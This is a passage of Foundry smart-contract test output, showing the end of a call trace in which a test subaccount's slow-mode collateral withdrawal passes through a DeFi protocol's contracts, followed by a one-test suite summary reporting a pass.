    │   │   ├─ [69046] 0x05ec92D78ED421f3D3Ada77FFdE167106565974E::processSlowModeTransaction(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000002)
    │   │   │   ├─ [68350] 0x34D3369421070e52EB881527eD23A934486427Dc::processSlowModeTransaction(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 0x026ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f44455445535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000000000002) [delegatecall]
    │   │   │   │   ├─ [65797] 0xD218103918C19D0A10cf35300E4CfAfbD444c5fE::withdrawCollateral(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0, 50000000 [5e7], 0x0000000000000000000000000000000000000000, 115035 [1.15e5])
    │   │   │   │   │   ├─ [65119] 0x253cEe58633AF8AAB5e64669Ef197fB7742F9ba7::withdrawCollateral(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0, 50000000 [5e7], 0x0000000000000000000000000000000000000000, 115035 [1.15e5]) [delegatecall]
    │   │   │   │   │   │   ├─ [2340] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getConfig(0) [staticcall]
    │   │   │   │   │   │   │   ├─ [1650] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getConfig(0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   ├─ [6916] 0x0200C29006150606B650577BBE7B6248F58470c1::transfer(0x09fb495AA7859635f755E827d64c4C9A2e5b9651, 50000000 [5e7])
    │   │   │   │   │   │   │   ├─ [6253] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::transfer(0x09fb495AA7859635f755E827d64c4C9A2e5b9651, 50000000 [5e7]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xD218103918C19D0A10cf35300E4CfAfbD444c5fE, to: 0x09fb495AA7859635f755E827d64c4C9A2e5b9651, value: 50000000 [5e7])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [1620] 0x09fb495AA7859635f755E827d64c4C9A2e5b9651::submitWithdrawal(0x0200C29006150606B650577BBE7B6248F58470c1, user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 50000000 [5e7], 115035 [1.15e5])
    │   │   │   │   │   │   │   ├─ [948] 0x8A2bfb0BE373Cb16BB2aB579cF0f4183cDCf2e6C::submitWithdrawal(0x0200C29006150606B650577BBE7B6248F58470c1, user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D], 50000000 [5e7], 115035 [1.15e5]) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [2340] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getConfig(0) [staticcall]
    │   │   │   │   │   │   │   ├─ [1650] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getConfig(0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   │   └─ ← [Return] Config({ token: 0x0200C29006150606B650577BBE7B6248F58470c1, interestInflectionUtilX18: 800000000000000000 [8e17], interestFloorX18: 10000000000000000 [1e16], interestSmallCapX18: 40000000000000000 [4e16], interestLargeCapX18: 1000000000000000000 [1e18], withdrawFeeX18: 1000000000000000000 [1e18], minDepositRateX18: 0 })
    │   │   │   │   │   │   ├─ [1014] 0x0200C29006150606B650577BBE7B6248F58470c1::decimals() [staticcall]
    │   │   │   │   │   │   │   ├─ [357] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::decimals() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   │   │   │   └─ ← [Return] 6
    │   │   │   │   │   │   ├─ [8956] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::updateBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, -50000000000000000000 [-5e19])
    │   │   │   │   │   │   │   ├─ [8290] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::updateBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, -50000000000000000000 [-5e19]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit SpotBalance(subaccount: 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, productId: 0, amount: 99999999999999999997 [9.999e19], lastCumulativeMultiplierX18: 1000000858388862927 [1e18])
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [3062] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::assertUtilization(0) [staticcall]
    │   │   │   │   │   │   │   ├─ [2405] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::assertUtilization(0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [9133] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0)
    │   │   │   │   │   │   │   ├─ [8470] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit PriceQuery(productId: 0)
    │   │   │   │   │   │   │   │   └─ ← [Return] 99999999999999999997 [9.999e19]
    │   │   │   │   │   │   │   └─ ← [Return] 99999999999999999997 [9.999e19]
    │   │   │   │   │   │   ├─ [2322] 0xF8599D58d1137fC56EcDd9C16ee139C8BDf96da1::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0)
    │   │   │   │   │   │   │   ├─ [1659] 0x758cB3EB5DEf3ca296a316d41f47e0f3899214ac::getHealthContribution(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [6582] 0xF8599D58d1137fC56EcDd9C16ee139C8BDf96da1::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 2, 0)
    │   │   │   │   │   │   │   ├─ [5907] 0x758cB3EB5DEf3ca296a316d41f47e0f3899214ac::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 2, 0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 86406623016887042619877 [8.64e22], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 86406623016887042619877 [8.64e22], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   ├─ [6582] 0xF8599D58d1137fC56EcDd9C16ee139C8BDf96da1::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 4, 0)
    │   │   │   │   │   │   │   ├─ [5907] 0x758cB3EB5DEf3ca296a316d41f47e0f3899214ac::getCoreRisk(0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, 4, 0) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 2818499613537808623490 [2.818e21], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   │   └─ ← [Return] CoreRisk({ amount: 0, price: 2818499613537808623490 [2.818e21], longWeight: 950000000000000000 [9.5e17] })
    │   │   │   │   │   │   ├─ emit ModifyCollateral(amount: -50000000000000000000 [-5e19], subaccount: 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354, productId: 0)
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [2318] 0xFcD94770B95fd9Cc67143132BB172EB17A0907fE::getBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354) [staticcall]
    │   ├─ [1655] 0x5f6d7228962eD666309a20b8f07f427cc48799eF::getBalance(0, 0x6ca6d1e2d5347bfab1d91e883f1915560e09129d534c4f574d4f444554455354) [delegatecall]
    │   │   └─ ← [Return] Balance({ amount: 99999999999999999997 [9.999e19] })
    │   └─ ← [Return] Balance({ amount: 99999999999999999997 [9.999e19] })
    ├─ [1240] 0x0200C29006150606B650577BBE7B6248F58470c1::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   ├─ [580] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [delegatecall]
    │   │   └─ ← [Return] 58000000 [5.8e7]
    │   └─ ← [Return] 58000000 [5.8e7]
    ├─ [1240] 0x0200C29006150606B650577BBE7B6248F58470c1::balanceOf(0x09fb495AA7859635f755E827d64c4C9A2e5b9651) [staticcall]
    │   ├─ [580] 0x06d886Ff518b5E642E7E6aaD3cE797B7DABD8e9a::balanceOf(0x09fb495AA7859635f755E827d64c4C9A2e5b9651) [delegatecall]
    │   │   └─ ← [Return] 50060000000 [5.006e10]
    │   └─ ← [Return] 50060000000 [5.006e10]
    ├─ [1202] 0x09fb495AA7859635f755E827d64c4C9A2e5b9651::markedIdxs(115035 [1.15e5]) [staticcall]
    │   ├─ [542] 0x8A2bfb0BE373Cb16BB2aB579cF0f4183cDCf2e6C::markedIdxs(115035 [1.15e5]) [delegatecall]
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 56.33s (25.10s CPU time)

Ran 1 test suite in 57.47s (56.33s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

